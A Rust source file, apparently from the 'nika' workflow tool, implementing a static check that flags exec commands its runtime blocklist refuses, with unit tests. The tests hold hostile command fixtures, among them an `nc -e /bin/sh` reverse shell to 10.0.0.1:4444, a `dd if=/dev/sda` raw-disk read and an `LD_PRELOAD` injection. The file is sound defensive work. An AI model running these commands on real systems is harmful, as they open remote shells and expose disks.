// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! The exec-floor finding (#605) — an argv-form `exec:` command the
//! runtime's exec floor WILL refuse is a `NIKA-SEC-001` FINDING at check,
//! not a green audit that dies at spawn.
//!
//! The predicate is [`nika_types::exec::argv_floor_refusal`] — the ONE the
//! runtime's pre-spawn refusal (`nika-exec-runner::blocklist::check_argv`)
//! judges with, so check ≡ run by construction (the
//! `net::host_in_allowlist` precedent: an L0 leaf both sides depend on).
//! This lane was born (P0-13 · 2026-07-30) as an advisory `exec-floor`
//! HINT over a hand-mirrored eval table with a textual keep-in-sync
//! ratchet — the mirror is deleted here: a duplicated predicate is the
//! drift class #605 names, and a hint cannot fail a file the run refuses
//! (the write-conflict precedent, F-P15: an error owns its repair, never
//! a hint).
//!
//! SCOPE (the honest mirror, never a lie in either direction):
//!
//! - **argv form only** — the shell form rides the joined-string
//!   blocklist, which judges the INTERPOLATED string at run time; a
//!   static claim there would predict a refusal the runtime does not
//!   apply verbatim. Silence.
//! - **literal argv only** — a `${{ }}` island in the program or any
//!   argument makes the positional parse unreliable: the runtime re-judges
//!   the resolved argv pre-spawn (`NIKA-SEC-001` there). No static claim.
//!
//! Both directions are pinned by this module's tests, and the cross-crate
//! agreement (`bash -c` · `sh -e` · the benign negative) is pinned against
//! the REAL runtime wrapper in `nika-exec-runner`'s
//! `check_and_run_agree_on_the_argv_floor`.

use nika_schema::raw::{RawAction, RawCommand, RawWorkflow};
use nika_types::exec::ArgvFloorRefusal;

/// The wire code of an argv-floor refusal (spec 05 — the same code the
/// run stamps on the `ShellError::Blocked` it would raise at spawn).
pub(crate) const EXEC_FLOOR_CODE: &str = "NIKA-SEC-001";

/// One argv-floor finding — the check-time twin of the runtime refusal.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[non_exhaustive]
pub struct ExecFloorFinding {
    /// The offending task.
    pub task: String,
    /// The witness sentence (the refused program + the law it breaks).
    pub detail: String,
    /// The repair (a script file · a program the floor admits).
    pub fix: String,
}

impl ExecFloorFinding {
    /// The canonical spec code this finding stamps.
    #[must_use]
    pub fn wire_code(&self) -> &'static str {
        EXEC_FLOOR_CODE
    }
}

/// Scan every argv-form `exec:` task (and `on_finally` cleanups) for a
/// command the runtime's exec floor WILL refuse — one finding per task.
/// DAG-independent (a per-task syntactic judgment): runs even when
/// conformance fails, like the permits-fit lane.
pub(crate) fn scan(wf: &RawWorkflow) -> Vec<ExecFloorFinding> {
    let mut out = Vec::new();
    for task in &wf.tasks {
        let id = task.value.id.value.as_str();
        push_exec_floor(&task.value.action, id, &mut out);
    }
    out
}

fn push_exec_floor(action: &RawAction, id: &str, out: &mut Vec<ExecFloorFinding>) {
    let RawAction::Exec(exec) = action else {
        return;
    };
    let RawCommand::Argv(parts) = &exec.command else {
        return; // the shell form rides the joined-string blocklist — no argv-floor claim
    };
    let mut elements = parts.iter().map(|p| p.value.as_str());
    let Some(program) = elements.next() else {
        return;
    };
    let args: Vec<&str> = elements.collect();
    // A `${{ }}` island anywhere makes the positional parse unreliable —
    // no static claim (the native-first precedent: a templated head makes
    // no claim; the runtime re-judges the resolved argv pre-spawn).
    if program.contains("${{") || args.iter().any(|a| a.contains("${{")) {
        return;
    }
    let Some(refusal) = nika_types::exec::argv_floor_refusal(program, &args) else {
        return;
    };
    let (detail, fix) = describe(&refusal);
    out.push(ExecFloorFinding {
        task: id.to_owned(),
        detail,
        fix,
    });
}

/// The witness + the repair, per refusal class. The fix only teaches a
/// route an author can WRITE (the N-6 law: `pre_validated` is the kernel's
/// internal wire flag, never authorable — name the script file instead).
fn describe(refusal: &ArgvFloorRefusal) -> (String, String) {
    match refusal {
        ArgvFloorRefusal::InterpreterEval { base } => (
            format!(
                "`{base}` with an inline-eval flag or subcommand is REFUSED at the exec \
                 floor (the runtime parses the argv positionally, per interpreter — this \
                 command never starts)"
            ),
            format!(
                "move the code into a script file and invoke `{base}` on the file \
                 (a file is data the floor can trust; inline code is not)"
            ),
        ),
        ArgvFloorRefusal::DangerousProgram { base } => (
            format!(
                "program `{base}` is blocked at the exec floor (privilege escalation / \
                 system control / re-exec) — the run refuses it before spawn"
            ),
            String::from(
                "no permit opens the floor (the blocklist is always-on): call a program \
                 that is not on it",
            ),
        ),
        ArgvFloorRefusal::NetcatExec => (
            String::from(
                "`nc`/`ncat` with `-e`/`-c` (a reverse shell) is REFUSED at the exec \
                 floor — the command never starts",
            ),
            String::from("a listener needs no eval flag; a reverse shell has no workflow route"),
        ),
        ArgvFloorRefusal::DdRawDisk => (
            String::from(
                "`dd` with `if=`/`of=` (raw disk read/write) is REFUSED at the exec \
                 floor — the command never starts",
            ),
            String::from("use `nika:read`/`nika:write` under a declared fs boundary"),
        ),
        // #[non_exhaustive] — a future refusal class still earns a finding;
        // the reason sentence is the one truth both surfaces quote.
        other => (other.reason(), String::from("the exec floor is always-on")),
    }
}

#[cfg(test)]
mod tests {
    use super::EXEC_FLOOR_CODE;
    use crate::check;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn report(yaml: &str) -> crate::CheckReport {
        check(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("fixture parses"))
    }

    fn exec_wf(command_yaml: &str) -> String {
        format!(
            "nika: w\npermits:\n  exec: true\ntasks:\n  t:\n    exec: {{ command: {command_yaml} }}\n"
        )
    }

    fn floor_findings(yaml: &str) -> Vec<crate::ExecFloorFinding> {
        report(yaml).exec_floor_findings
    }

    /// THE issue's repro (#605): `["bash", "-c", "echo hello"]` checked
    /// GREEN while the run refused it with NIKA-SEC-001. The check now
    /// refuses too — a finding, not a hint.
    #[test]
    fn the_issues_repro_is_a_sec001_finding() {
        // The issue's exact shape (map-form tasks · capture: stdout):
        let r = report(
            "nika: sec001-repro\npermits:\n  exec: [\"bash\"]\ntasks:\n  inline:\n    exec:\n      capture: stdout\n      command: [\"bash\", \"-c\", \"echo hello\"]\n",
        );
        assert!(
            !r.is_clean(),
            "the repro must not check clean (exit 2): {:#?}",
            r.findings
        );
        let hit = r
            .findings
            .iter()
            .find(|f| f.kind == "exec_floor")
            .expect("the exec-floor row in findings[]");
        assert_eq!(hit.code.as_deref(), Some("NIKA-SEC-001"));
        assert_eq!(
            hit.docs_url.as_deref(),
            Some("https://nika.sh/language/errors/NIKA-SEC-001")
        );
        assert_eq!(hit.task.as_deref(), Some("inline"));
        assert!(hit.message.contains("bash"), "{}", hit.message);
        assert!(
            hit.message.contains("script file"),
            "the real route is taught: {}",
            hit.message
        );
        // N-6 · the phantom-route pin: `pre_validated` is the kernel's
        // internal wire flag, never authorable — a finding may only teach
        // a field an author can write.
        assert!(
            !hit.message.contains("pre_validated"),
            "a finding may only teach a field an author can write: {}",
            hit.message
        );
    }

    /// The benign negative: `["echo", "hi"]` — no eval flag — stays green.
    #[test]
    fn a_benign_argv_stays_green() {
        let r = report(&exec_wf("[\"echo\", \"hi\"]"));
        assert!(
            r.is_clean(),
            "a benign argv must stay clean: {:#?}",
            r.findings
        );
        assert!(r.exec_floor_findings.is_empty());
    }

    /// The issue's « why it bites »: an `on_error: { skip: true }` leg
    /// swallows the runtime refusal as SKIP — the static finding is what
    /// prevents the class, and it fires regardless of the recovery shape.
    #[test]
    fn on_error_skip_does_not_swallow_the_static_finding() {
        let r = report(
            "nika: w\npermits:\n  exec: true\ntasks:\n  t:\n    on_error: { skip: true }\n    exec: { command: [\"bash\", \"-c\", \"echo hi\"] }\n",
        );
        assert_eq!(
            r.exec_floor_findings.len(),
            1,
            "the finding fires under skip:true — the run would have hidden it: {:#?}",
            r.findings
        );
        assert!(!r.is_clean());
    }

    /// The whole floor is judged, not only the eval class: a dangerous
    /// PROGRAM (`sudo`), `nc -e`, and `dd if=` are SEC-001 findings too —
    /// the same argv the runtime's `check_argv` refuses.
    #[test]
    fn the_whole_argv_floor_is_judged() {
        for command in [
            "[\"sudo\", \"ls\"]",
            "[\"nc\", \"-e\", \"/bin/sh\", \"10.0.0.1\", \"4444\"]",
            "[\"dd\", \"if=/dev/sda\", \"of=/dev/null\"]",
            "[\"env\", \"LD_PRELOAD=/tmp/x.so\", \"cat\"]",
        ] {
            let findings = floor_findings(&exec_wf(command));
            assert_eq!(
                findings.len(),
                1,
                "{command} must earn the SEC-001 finding: {findings:?}"
            );
            assert_eq!(findings[0].wire_code(), "NIKA-SEC-001");
        }
    }

    /// The per-interpreter map: node `-c` is a syntax CHECK (allowed),
    /// `sh -e` is errexit (allowed), deno `eval` is a SUBCOMMAND the flag
    /// scan never sees (refused) — one predicate, no over/under-refusal.
    #[test]
    fn the_per_interpreter_table_is_the_runtime_one() {
        assert!(floor_findings(&exec_wf("[\"node\", \"-c\", \"server.js\"]")).is_empty());
        assert!(floor_findings(&exec_wf("[\"sh\", \"-e\", \"deploy.sh\"]")).is_empty());
        assert_eq!(
            floor_findings(&exec_wf("[\"deno\", \"eval\", \"Deno.exit(1)\"]")).len(),
            1,
            "the eval subcommand refuses"
        );
        assert_eq!(
            floor_findings(&exec_wf(
                "[\"python3\", \"-X\", \"faulthandler\", \"-c\", \"x\"]"
            ))
            .len(),
            1,
            "a value flag does not hide the eval flag after it"
        );
        assert!(
            floor_findings(&exec_wf(
                "[\"python3\", \"-m\", \"unittest\", \"discover\", \"tests\", \"-p\", \"test_*.py\"]"
            ))
            .is_empty(),
            "the module handoff cuts the scan (P0-13's false-positive fixture)"
        );
    }

    /// Interpreters on SCRIPT FILES stay silent — the eval floor only
    /// judges the interpreter's own argv, before the script positional.
    #[test]
    fn script_files_stay_silent() {
        for command in [
            "[\"python3\", \"app.py\", \"-p\", \"8080\"]",
            "[\"node\", \"server.js\"]",
            "[\"bash\", \"deploy.sh\", \"prod\"]",
            "[\"make\", \"build\"]",
        ] {
            let findings = floor_findings(&exec_wf(command));
            assert!(
                findings.is_empty(),
                "{command} must stay silent: {findings:?}"
            );
        }
    }

    /// A templated program or argument makes NO claim — the runtime
    /// re-judges the interpolated argv pre-spawn (SEC-001 there); the
    /// check stays silent rather than guess.
    #[test]
    fn templated_argv_makes_no_claim() {
        for command in [
            "[\"${{ inputs.tool }}\", \"-p\", \"1+1\"]",
            "[\"node\", \"-p\", \"${{ inputs.code }}\"]",
            "[\"node\", \"${{ inputs.flag }}\", \"1+1\"]",
        ] {
            let findings = floor_findings(&exec_wf(command));
            assert!(
                findings.is_empty(),
                "{command} makes no static claim: {findings:?}"
            );
        }
    }

    /// The SHELL form stays silent: the runtime judges the joined string
    /// at run time (a different scan, over the interpolated text) — the
    /// static lane makes no argv-floor claim there.
    #[test]
    fn the_shell_form_makes_no_argv_floor_claim() {
        let r = report(
            "nika: w\npermits:\n  exec: true\ntasks:\n  t:\n    exec: { shell: \"node -p 1+1\" }\n",
        );
        assert!(
            r.exec_floor_findings.is_empty(),
            "no lie in the refusal direction: {:?}",
            r.exec_floor_findings
        );
    }

    /// The program's PATH prefix does not hide the interpreter (the
    /// predicate basenames `command[0]` — NFKC fold included, the case the
    /// old hand-mirror under-claimed on).
    #[test]
    fn a_pathed_interpreter_is_still_judged() {
        let findings = floor_findings(&exec_wf("[\"/usr/bin/python3\", \"-c\", \"import os\"]"));
        assert_eq!(findings.len(), 1, "the basename is judged: {findings:?}");
    }

    /// The emitted⊆registered ratchet, exec-floor tier (the
    /// `permit_taint.rs` pattern): the wire code this lane stamps must
    /// exist in the vendored canon registry — an unregistered refusal
    /// 404s the `docs_url` every finding carries.
    #[test]
    fn the_exec_floor_code_is_registered_in_the_canon() {
        let registered: std::collections::BTreeSet<String> = nika_pack::error_codes()
            .into_iter()
            .map(|row| row.code.to_string())
            .collect();
        assert!(
            registered.contains(EXEC_FLOOR_CODE),
            "`{EXEC_FLOOR_CODE}` is not in the canon registry (spec/05-errors.md SSOT)"
        );
    }
}
